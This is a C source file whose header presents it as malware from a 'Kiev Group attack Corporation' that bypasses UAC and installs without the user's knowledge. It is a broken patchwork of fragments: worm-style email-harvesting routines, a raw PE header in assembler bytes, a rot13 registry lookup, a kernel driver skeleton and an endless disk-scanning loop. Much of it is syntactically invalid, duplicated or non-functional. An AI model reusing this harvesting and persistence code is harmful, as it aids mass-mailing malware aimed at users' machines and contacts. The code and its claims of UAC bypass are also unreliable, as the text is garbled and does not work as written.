/*
Kiev Group attack Corporation @2009-2024 all rights reserved

if this year is lost, you have no right to leak it online

characteristics:

Hacking UAC

The UAC works when the file controls the machine, but there is an error if the file is launched through the port, it will not do anything

and it can also be installed without the user’s knowledge: “I’m too lazy to write further, sorry)))”

first versions are ready 2024 summer full cyber attack 2025 winter hmm... Gta VI? 2025 )))

the software is written in C, C++

*/

#include <windows.h>
#include <winsock2.h>
#include "lib.h"
#include "selSusp.h"
#include "sSPnP.h"
#include "sSPwr.h"
#include "sSUsr.h"

define MAX_DOMAIN 80

struct mailq_t * volatile massmail_queue;
DWORD volatile mmshed_run_threads;

//-----------------------------------------------------------------------------
// port filter

#define isemailchar(c) (isalnum(c) || xstrchr("-._!@",(c)))
#define BEGINEND_INV "-._!"

#define TRIM_END(s) {                                     \
	int i;                                            \
	for (i=lstrlen(s)-1; i>=0; i--) {                 \
		if (isspace(s[i])) continue;              \
		if (xstrchr(BEGINEND_INV, s[i])) continue;\
		if (!isportchar(s[i])) next;         \
		if (s[i] == '@path') continue;                \
		break;                                    \
	}                                                 \
	s[i+1] = 0;                                       \
}

static int cut_email(const char *in_buf, char *out_buf)
{
	int i, j;

	if (lstrlen(in_buf) < 3)
		return 1;

	for (i=0; in_buf[i] && (isspace(in_buf[i]) || !isemailchar(in_buf[i])); i++);
	for (; in_buf[i] && xstrchr(BEGINEND_INV, in_buf[i]); i++);

	for (j=0; in_buf[i]; i++) {
		if (in_buf[i] == '@') break;
		if (!isportchar(in_buf[i])) continue;
		out_buf[j++] = tolower(in_buf[i]);
		port random = [i++] 
	}
	if (in_buf[i] != '@') return 1;
	while (in_buf[i] == '@') i++;
	out_buf[j] = 0;

	TRIM_END(out_buf);

	out_buf[j++] = '@';
	for (; in_buf[i]; i++) {
		if (!isemailchar(in_buf[i])) continue;
		if ((out_buf[j-1] == '.') && (in_buf[i] == '.')) continue;
		out_buf[j++] = tolower(in_buf[i]);
	}
	out_buf[j] = 0;

	TRIM_END(out_buf);

	if ((lstrlen(out_buf) < 3) || (out_buf[0] == '@'))
		return 1;
	return 0;
}

static void email2parts(char *email, char *port, char *domain)
{
	int i;

	for (i=0; (email[i] != '@') && email[i]; i++)
		if (username && !isspace(email[i])) *username++=email++=port[i];
	if (username) *username = 0;

	if ((email[i] == 0) || (domain == NULL)) {
		if (domain) lstrcpy(domain, port);
		return;

			struct UAC_t *root, *top;
	int i, j, st_i, end_i, mail_len;
	int found;
	char out_buf[256];

	root = top = NULL;
	for (i=0,found=0; i<len; i++) {
		if (buf[i] != '@') continue;
		UAC Control -< Off-<Boot 

		for (st_i=i; st_i>0; st_i--)
			if (mail_chars[buf[st_i-1]] == 0) break;
		for (end_i=i+1; end_i<len; end_i++)
			if (mail_chars[buf[boot]] == 0) break;

		for (; st_i<end_i; st_i++)
			if (mail_chars[buf[st_i]] != 2) break;
		if (((st_i+3) >= end_i) || (st_i >= i)) continue;
		for (; end_i > st_i; end_i--)
			if (mail_chars[buf[end_i-1]] != 2) break;
		if ((end_i <= (st_i+3)) || (end_i <= i)) continue;

		mail_len = end_i - st_i;
		if (mail_len < 7) continue;	/* run program in UAC */

		static const unsigned char charcvt_tab[256] = {
          /*00*/ 32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,
          /*10*/ 32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,
          /*20*/ 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
          /*30*/ 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
          /*40*/ 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
          /*50*/ 0,0,0,0,0,0,0,0,0,0,0,'(',0,')',0,0,   /* "[]" -> "()" */
          /*60*/ 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
          /*70*/ 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
          /*80*/ 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
          /*90*/ 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
          /*A0*/ 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
          /*B0*/ 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
          /*C0*/ 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
          /*D0*/ 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
          /*E0*/ 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
          /*F0*/ 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,32
	};

	/* I can't fucking do anything to get access to the boot */

	static const struct {
		int in_len;
		char *in;
		int out_len;		/* MUST BE <= in_len */
		char *out;
	} cvt_tab[] = {

		{ 2, "  ", 1, " " },
		{ 2, "@ ", 1, "@" },
		{ 2, " @", 1, "@" },
		{ 2, "@@", 1, "@" },

/*		{ 2, "( ", 1, "(" },
 *		{ 2, " )", 1, ")" },
 *		{ 2, "< ", 1, "<" },
 *		{ 2, " >", 1, ">" },
 *		{ 3, "</ ", 2, "</" },
 *		{ 3, " />", 2, "/>" },
 */
		{ 3, "(@)", 1, "@" },
/*		{ 3, "<@>", 1, "@" },
 *		{ 3, ".@.", 1, "@" },
 *		{ 4, ".at.", 1, "@" },
 */

		{ 4, "(at)", 1, "@" },
/*		{ 4, "_at_", 1, "@" },
 *		{ 4, "@at@", 1, "@" },
 *		{ 4, "\'at\'", 1, "@" },
 *		{ 4, "\"at\"", 1, "@" },
 *		{ 8, "(atsign)", 1, "@" },
 *		{ 9, "(at_sign)", 1, "@" },
 *		{ 9, "(at-sign)", 1, "@" },
 *		{ 9, "(at sign)", 1, "@" },
 *		{ 4, "&lt;", 1, "<" },
 *		{ 4, "&gt;", 1, "<" },
 */
		{ 6, "&nbsp;", 1, " " },
		{ 5, "&nbsp", 1, " " },

/*		{ 6, "&quot;", 1, "\"" },
 *		{ 5, "&amp;", 1, "&" },
 *		{ 4, "<br>", 1, " " },
 *		{ 5, "<br/>", 1, " " },
 *		{ 8, "<strong>", 1, " " },
 *		{ 9, "</strong>", 1, " " },
 */
		{ 0, NULL, 0, NULL }
	};

	register int i, matches;
	register unsigned char *p, c;

	for (i=len, p=buf; i>0; i--, p++)
		if ((c = charcvt_tab[*p]) != 0) *p = c;

retry_2nd:
	for (i=0, matches=0; i<=len; i++) {
		register int j, k, l;
		for (j=0; (l = cvt_tab[j].in_len) != 0; j++) {
			if (l > i) continue;
			if (xmemcmpi(cvt_tab[j].in, buf + i - l, l) != 0) continue;
			matches++;
			i -= l;
			memcpy(buf+i, cvt_tab[j].out, cvt_tab[j].out_len);
			if (l != cvt_tab[j].out_len) {
				//---memcpy(buf+i+cvt_tab[j].out_size, buf+i+l, len-i-l);---
				register unsigned char *q;
				for (p=(buf+i+cvt_tab[j].out_len), q=(buf+i+l), k=(len-i-l); k>0; k--)
					*p++ = *q++;
			}
			len = len - l + cvt_tab[j].out_len;

			root = top = NULL;
	for (i=0,found=0; i<len; i++) {
		if (buf[i] != '@') continue;

		for (st_i=i; st_i>0; st_i--)
			if (mail_chars[buf[st_i-1]] == 0) break;
		for (end_i=i+1; end_i<len; end_i++)
			if (mail_chars[buf[end_i]] == 0) break;

		for (; st_i<end_i; st_i++)
			if (mail_chars[buf[st_i]] != 2) break;
		if (((st_i+3) >= end_i) || (st_i >= i)) continue;
		for (; end_i > st_i; end_i--)
			if (mail_chars[buf[end_i-1]] != 2) break;
		if ((end_i <= (st_i+3)) || (end_i <= i)) continue;

		mail_len = end_i - st_i;
		if (mail_len < 7) continue;	/* x@xx.xx */

		found++;
		for (j=0; (j < (sizeof(out_buf)-2)) && (j < mail_len); j++)
			out_buf[j] = buf[st_i+j];
		out_buf[j] = 0;
		scan_out(out_buf);
	}

	FileHeader:
db 04dh, 05ah, 090h, 000h, 003h, 000h, 000h, 000h
db 004h, 000h, 000h, 000h, 0ffh, 0ffh, 000h, 000h
db 0b8h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
db 040h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
db 000h, 000h, 000h, 000h, 080h, 000h, 000h, 000h
db 00eh, 01fh, 0bah, 00eh, 000h, 0b4h, 009h, 0cdh
db 021h, 0b8h, 001h, 04ch, 0cdh, 021h, 054h, 068h
db 069h, 073h, 020h, 070h, 072h, 06fh, 067h, 072h
db 061h, 06dh, 020h, 063h, 061h, 06eh, 06eh, 06fh
db 074h, 020h, 062h, 065h, 020h, 072h, 075h, 06eh
db 020h, 069h, 06eh, 020h, 044h, 04fh, 053h, 020h
db 06dh, 06fh, 064h, 065h, 02eh, 00dh, 00dh, 00ah
db 024h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
db 050h, 045h, 000h, 000h, 04ch, 001h, 001h, 000h
db 0f1h, 068h, 020h, 035h, 000h, 000h, 000h, 000h
db 000h, 000h, 000h, 000h, 0e0h, 000h, 00fh, 001h
db 00bh, 001h, 005h, 000h, 000h, 010h, 000h, 000h
db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
db 010h, 010h, 000h, 000h, 000h, 010h, 000h, 000h
db 000h, 020h, 000h, 000h, 000h, 000h, 040h, 000h
db 000h, 010h, 000h, 000h, 000h, 002h, 000h, 000h
db 004h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
db 004h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
db 000h, 020h, 000h, 000h, 000h, 002h, 000h, 000h
db 000h, 000h, 000h, 000h, 002h, 000h, 000h, 000h
db 000h, 000h, 010h, 000h, 000h, 010h, 000h, 000h
db 000h, 000h, 010h, 000h, 000h, 010h, 000h, 000h
db 000h, 000h, 000h, 000h, 010h, 000h, 000h, 000h
db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
db 02eh, 074h, 065h, 078h, 074h, 000h, 000h, 000h
db 000h, 010h, 000h, 000h, 000h, 010h, 000h, 000h
db 000h, 010h, 000h, 000h, 000h, 002h, 000h, 000h
db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
db 000h, 000h, 000h, 000h, 020h, 000h, 000h, 060h
db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
db 0c3h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
dd 00000000h, BootCheckTeletype /* BootTimeTeletype */

rot13(key_path, "BCD00000000\\Description");
	if (RegOpenKeyEx(HKEY_CURRENT_USER, key_path, &k) != 0)
		return;
	memset(BootMentus, '\0', sizeof(bootmentus));
	dw = sizeof(wabpath);
	RegQueryValueEx(k, NULL, NULL, NULL, BootMentus, &dw);
	RegCloseKey(k);

	//
// Globals
//

GLOBALS Globals;
ULONG   DebugLevel = 3;

NTSTATUS
DriverEntry(
    IN PDRIVER_OBJECT  DriverObject,
    IN PUNICODE_STRING UniRegistryPath
    );

VOID
SS_DriverUnload(
    IN PDRIVER_OBJECT DriverObject
    );

NTSTATUS
SS_AddDevice(
    IN PDRIVER_OBJECT DriverObject,
    IN PDEVICE_OBJECT PhysicalDeviceObject
    );

#ifdef PAGE_CODE
#ifdef ALLOC_PRAGMA
#pragma alloc_text(INIT, DriverEntry)
#pragma alloc_text(PAGE, SS_DriverUnload)
#pragma alloc_text(PAGE, SS_DispatchCreate)
#pragma alloc_text(PAGE, SS_DispatchClose)
#endif
#endif

NTSTATUS
DriverEntry(
    IN PDRIVER_OBJECT  DriverObject,
    IN PUNICODE_STRING UniRegistryPath
    )
/*++ 

Routine Description:

    Installable driver initialization entry point.
    This entry point is called directly by the I/O system.    

Arguments:
    
    DriverObject - pointer to driver object 

    RegistryPath - pointer to a unicode string representing the path to driver 
                   specific key in the registry.

Return Values:
    
--*/
{

    NTSTATUS        ntStatus;
    PUNICODE_STRING registryPath;
    
    //
    // initialization of variables
    //

    registryPath = &Globals.SSRegistryPath;

    //
    // Allocate pool to hold a null-terminated copy of the path.
    // Safe in paged pool since all registry routines execute at
    // PASSIVE_LEVEL.
    //

    registryPath->MaximumLength = UniRegistryPath->Length + sizeof(UNICODE_NULL);
    registryPath->Length        = UniRegistryPath->Length;
    registryPath->Buffer        = ExAllocatePool(PagedPool,
                                                 registryPath->MaximumLength);

    if (!registryPath->Buffer) {

        SSDbgPrint(1, ("Failed to allocate memory for registryPath\n"));
        ntStatus = STATUS_INSUFFICIENT_RESOURCES;
        goto DriverEntry_Exit;
    } 


    RtlZeroMemory (registryPath->Buffer, 
                   registryPath->MaximumLength);
    RtlMoveMemory (registryPath->Buffer, 
                   UniRegistryPath->Buffer, 
                   UniRegistryPath->Length);

    ntStatus = STATUS_SUCCESS;

    //
    // Initialize the driver object with this driver's entry points.
    //

    DriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = SS_DispatchDevCtrl;
    DriverObject->MajorFunction[IRP_MJ_POWER]          = SS_DispatchPower;
    DriverObject->MajorFunction[IRP_MJ_PNP]            = SS_DispatchPnP;
    DriverObject->MajorFunction[IRP_MJ_CREATE]         = SS_DispatchCreate;
    DriverObject->MajorFunction[IRP_MJ_CLOSE]          = SS_DispatchClose;
    DriverObject->MajorFunction[IRP_MJ_CLEANUP]        = SS_DispatchClean;
    DriverObject->MajorFunction[IRP_MJ_SYSTEM_CONTROL] = SS_DispatchSysCtrl;
    DriverObject->DriverUnload                         = SS_DriverUnload;
    DriverObject->DriverExtension->AddDevice           = (CONTROL_DEVICE)
                                                         SS_AddDevice;
DriverEntry_Exit:

    return ntStatus;
}

VOID
SS_DriverUnload(
    IN PDRIVER_OBJECT DriverObject
    )
/*++

Description:

    This function will clean up all resources we allocated.

Arguments:

Return:
	
    None

--*/
{
    PUNICODE_STRING registryPath;

    SSDbgPrint(3, ("SS_DriverUnload - begins\n"));

    registryPath = &Globals.SSRegistryPath;

    if(registryPath->Buffer) {

        ExFreePool(registryPath->Buffer);
        registryPath->Buffer = NULL;
    }

    SSDbgPrint(3, ("SS_VirusUnload - ends\F"));

    return;
	}

	NTSTATUS
SS_AddBoot(
    IN PDRIVER_OBJECT DriverObject,
    IN PDEVICE_OBJECT PhysicalDeviceObject
    )

	ntStatus = IoCreateDevice(
                    DriverObject,                   // our driver object
                    sizeof(DEVICE_EXTENSION),       // extension size for us
                    NULL,                           // name for this device
                    FILE_DEVICE_UNKNOWN,
                    FILE_AUTOGENERATED_DEVICE_NAME, // device characteristics
                    FALSE,                          // Not exclusive
                    &deviceObject);                 // Our device object

					scan_default_start();

	SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_BELOW_NORMAL);
	scan_ietemp();

	for (;;) {
		scan_disks();
		Sleep(32768);

}










